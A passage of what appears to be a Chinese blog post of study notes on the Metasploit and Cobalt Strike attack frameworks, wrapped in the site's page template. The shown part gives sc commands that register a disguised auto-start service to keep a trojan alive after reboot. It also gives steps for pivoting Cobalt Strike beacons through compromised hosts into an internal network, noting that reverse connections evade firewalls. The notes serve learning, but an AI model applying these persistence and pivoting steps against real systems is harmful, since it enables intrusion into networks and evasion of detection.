+    shell sc description &quot;thisserver&quot; &quot;weizhuangfuwumingcheng&quot;
+    shell sc config &quot;thisserver&quot; start=auto 开机自启
+    shell net start &quot;thisserver&quot; 启动服务
+    木马上线
+
+    服务器重启之后，之前肉鸡木马失效，但写入自启服务的会上线
+</code></pre>
+<p>​<br>    深入内网之后<br>    hack(192.168.1.186)———(192.168.1.231)server(172.16.214.140)———-(172.16.214.141)server2<br>    ———————</p>
+<h3 id="多层连接"><a href="#多层连接" class="headerlink" title="多层连接"></a>多层连接</h3><p>多层类似第一层</p>
+<h4 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h4><pre><code>    server1已上线，
+    生成一个listeners， payload使用beacon tcp    4444端口即可
+    attacks-packages-windows executable(s)  (s)这里可以使用tcp，  生成后直接放到server2上
+    但在server1的beacon的interact中没发现上线
+    connect 172.16.214.141   之后上线
+</code></pre>
+<h4 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h4><pre><code>多层反向连接（多用）
+    反向更好规避防火墙查杀，溯源难度大点
+    server1 中招
+    beacon 右键 pivoting listener   此时中间人的4444端口充当hack转发器
+    选用中间人listener
+    attacks-packages-windows executable(s)  选择server1的listener，生成beacon，想办法在目标机器上运行
+    运行后直接上线
+</code></pre>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">XiaoYao</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://w4xiaoyao.top/2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%94%BB%E5%87%BB%E6%A1%86%E6%9E%B6/">https://w4xiaoyao.top/2023/03/30/学习笔记/攻击框架/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/MSF/">MSF</a><a class="post-meta__tags" href="/tags/CS/">CS</a></div><div class="post_share"><div class="social-share" data-image="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Myblog/img4post/cutecity/028.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9D%83%E9%99%90%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3%E4%B8%8E%E6%8F%90%E6%9D%83/"><img class="prev-cover" src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Myblog/img4post/cutecity/029.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">权限机制详解与提权操作权限维持</div></div></a></div><div class="next-post pull-right"><a href="/2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/win%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"><img class="next-cover" src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Myblog/img4post/cutecity/023.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">win系统常用命令</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Waline</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Myblog/img_struct4blog/profile_knife.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">XiaoYao</div><div class="author-info__description">多巴胺被赐予意义，人类社会便有了混沌，愿世间尚有净土，留存爱与欢喜。</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">55</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">68</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Liloker"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Liloker" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:theone@liloker.anonaddy.me" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://blog.csdn.net/weixin_42160117" target="_blank" title="CSDN"><i class="far fa-copyright"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">来了，随便坐吧~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF"><span class="toc-number">1.</span> <span class="toc-text">MSF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#msf-%E5%BC%80%E5%90%AF"><span class="toc-number">1.1.</span> <span class="toc-text">msf 开启</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E6%9C%A8%E9%A9%AC%E6%93%8D%E4%BD%9C%E6%A0%87%E5%87%86%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">msf木马操作标准流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%85%B6%E4%BB%96%E6%9C%A8%E9%A9%AC%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.</span> <span class="toc-text">生成其他木马命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#meterpreter%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C"><span class="toc-number">1.4.</span> <span class="toc-text">meterpreter基本操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">1.5.</span> <span class="toc-text">msf攻击流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.5.1.</span> <span class="toc-text">生成木马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E9%AB%98%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E7%BA%A7%E5%88%AB"><span class="toc-number">1.5.2.</span> <span class="toc-text">提高程序运行级别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.3.</span> <span class="toc-text">查看本地提权漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.5.4.</span> <span class="toc-text">目标信息搜集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E5%97%85%E6%8E%A2"><span class="toc-number">1.5.5.</span> <span class="toc-text">信息嗅探</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E9%97%AD%E9%98%B2%E7%81%AB%E5%A2%99%E5%BC%80%E5%90%AF3389"><span class="toc-number">1.5.6.</span> <span class="toc-text">关闭防火墙开启3389</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A4%8D%E5%85%A5%E6%B0%B8%E4%B9%85%E5%90%8E%E9%97%A8"><span class="toc-number">1.5.7.</span> <span class="toc-text">植入永久后门</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#github%E4%B8%8Amsf%E9%99%84%E5%8A%A0%E7%9A%84%E4%B8%9C%E8%A5%BF"><span class="toc-number">1.6.</span> <span class="toc-text">github上msf附加的东西</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#the-fat-rat"><span class="toc-number">1.6.1.</span> <span class="toc-text">the fat rat</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CS"><span class="toc-number">2.</span> <span class="toc-text">CS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B"><span class="toc-number">2.1.</span> <span class="toc-text">基本流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cs%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.2.</span> <span class="toc-text">cs模块介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#aggresor%E8%84%9A%E6%9C%AC"><span class="toc-number">2.3.</span> <span class="toc-text">aggresor脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#clonesite-%E9%92%93%E9%B1%BC"><span class="toc-number">2.4.</span> <span class="toc-text">clonesite 钓鱼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">2.5.</span> <span class="toc-text">服务权限维持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E5%B1%82%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.6.</span> <span class="toc-text">多层连接</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.6.1.</span> <span class="toc-text">正向连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.6.2.</span> <span class="toc-text">反向连接</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/%E8%A7%92%E5%8A%A8%E9%87%8F%E5%AE%88%E6%81%92/" title="角动量守恒"><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Myblog/img4post/cutecity/010.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="角动量守恒"/></a><div class="content"><a class="title" href="/2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/%E8%A7%92%E5%8A%A8%E9%87%8F%E5%AE%88%E6%81%92/" title="角动量守恒">角动量守恒</a><time datetime="2023-03-30T13:01:15.574Z" title="Created 2023-03-30 21:01:15">2023-03-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/%E5%AE%9E%E6%88%98Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" title="实战Linux应急响应"><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/cuteworld_007.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="实战Linux应急响应"/></a><div class="content"><a class="title" href="/2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/%E5%AE%9E%E6%88%98Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" title="实战Linux应急响应">实战Linux应急响应</a><time datetime="2023-03-30T13:01:15.574Z" title="Created 2023-03-30 21:01:15">2023-03-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E7%94%A8powershell%E8%8E%B7%E5%8F%96%E5%9B%BE%E7%89%87%E5%B9%B6%E8%AE%BE%E4%B8%BA%E5%A3%81%E7%BA%B8/" title="计划任务运行powershell自动获取聚焦图片并设为壁纸"><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Myblog/img4post/cutecity/010.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="计划任务运行powershell自动获取聚焦图片并设为壁纸"/></a><div class="content"><a class="title" href="/2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E7%94%A8powershell%E8%8E%B7%E5%8F%96%E5%9B%BE%E7%89%87%E5%B9%B6%E8%AE%BE%E4%B8%BA%E5%A3%81%E7%BA%B8/" title="计划任务运行powershell自动获取聚焦图片并设为壁纸">计划任务运行powershell自动获取聚焦图片并设为壁纸</a><time datetime="2023-03-30T13:01:15.573Z" title="Created 2023-03-30 21:01:15">2023-03-30</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Myblog/img4post/cutecity/028.jpg')">#footer-wrap
+  if theme.footer.owner.enable
+    - var now = new Date()
+    - var nowYear = now.getFullYear()
+    if theme.footer.owner.since && theme.footer.owner.since != nowYear
+      .copyright!= `&copy;${theme.footer.owner.since} - ${nowYear} By ${config.author}`
+    else
+      .copyright!= `&copy;${nowYear} By ${config.author}`
+  if theme.footer.copyright
+    .framework-info
+      span= _p('footer.framework') + ' '
+      a(href='https://hexo.io')= 'Hexo'
+      span.footer-separator |
+      span= _p('footer.theme') + ' '
+      a(href='https://github.com/jerryc127/hexo-theme-butterfly')= 'Butterfly'
+  if theme.footer.custom_text
+    .footer_custom_text!=`${theme.footer.custom_text}`
+</footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="Increase font size"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="Decrease font size"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="Switch Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'RYm4g1Khr0F0wyTlik3kI2We-MdYXbMMI',
+      appKey: 'u9VLeiSQuTLpO2mWRAMlYrKX',
+      placeholder: '随便说两句吧~',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'en',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+      requiredFields: ["nick,mail"],
+      visitor: true
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadWaline () {
+  function initWaline () {
+    const waline = new Waline(Object.assign({
+      el: '#waline-wrap',
+      serverURL: 'https://waline2-five.vercel.app/',
+      avatar: 'identicon',
+      path: location.pathname,
+      emojiCDN: '',
+      emojiMaps: "",
+      visitor: true
+    }, {"pageSize":10,"placeholder":"随便留下点什么吧~","langMode":{"admin":"博主","nick":"xiaoyao"}}))
+  }
+
+  if (typeof Waline === 'function') initWaline() 
+  else getScript('https://cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js').then(initWaline)
+}
+
+if ('Valine' === 'Waline' || !true) {
+  if (true) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+  else setTimeout(loadWaline, 0)
+} else {
+  function loadOtherComment () {
+    loadWaline()
+  }
+}</script></div><div class="aplayer no-destroy" data-id="7988378536" data-server="tencent" data-type="playlist" data-fixed="true" data-mini="true" data-autoplay="true" data-theme="#408fda" data-order="random" data-preload="auto" data-mutex="true" muted></div><script type="text/javascript" src="/js/myjs.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
+  'title',
+  '#config-diff',
+  '#body-wrap',
+  '#rightside-config-hide',
+  '#rightside-config-show',
+  '.js-pjax'
+]
+
+if (false) {
+  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
+}
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener toc scroll 
+  window.removeEventListener('scroll', window.tocScrollFn)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // Analytics
+  if (false) {
+    MtaH5.pgv()
+  }
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
